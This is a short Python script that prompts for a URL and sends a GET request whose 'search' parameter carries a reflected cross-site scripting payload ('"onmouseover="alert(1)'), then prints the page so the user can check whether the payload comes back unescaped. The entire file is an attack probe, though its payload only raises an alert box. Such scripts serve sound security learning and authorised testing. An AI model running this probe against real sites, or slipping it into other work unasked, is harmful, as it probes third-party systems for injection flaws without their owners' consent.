import requests
# dont forget to change the url
url = input("url : ")
r  = requests.get(url, params={'search':'"onmouseover="alert(1)'})

print(r.text)
